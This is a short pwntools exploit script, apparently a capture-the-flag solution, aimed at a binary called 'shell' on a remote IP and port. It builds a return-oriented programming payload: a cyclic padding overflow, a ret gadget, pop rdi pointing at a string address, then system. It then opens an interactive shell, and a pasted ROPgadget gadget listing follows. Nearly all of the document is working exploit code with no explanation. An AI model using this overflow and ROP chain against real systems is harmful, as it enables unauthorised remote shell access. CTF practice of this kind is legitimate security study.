from pwn import *

# io=process("./shell")
io=remote("1.14.71.254",28279)
elf=ELF("./shell")

ret_addr=0x400416
sys_addr=elf.sym[b"system"]
pop_rdi_addr=0x4005e3
str_0_addr=0x400541
payload=cyclic(0x18)+p64(ret_addr)+p64(pop_rdi_addr)+p64(str_0_addr)+p64(sys_addr)
io.sendline(payload)
io.interactive()





# Gadgets information
# ============================================================
# 0x00000000004005dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004005de : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004005e0 : pop r14 ; pop r15 ; ret
# 0x00000000004005e2 : pop r15 ; ret
# 0x00000000004005db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004005df : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004004b8 : pop rbp ; ret
# 0x00000000004005e3 : pop rdi ; ret
# 0x00000000004005e1 : pop rsi ; pop r15 ; ret
# 0x00000000004005dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400416 : ret

# Unique gadgets found: 11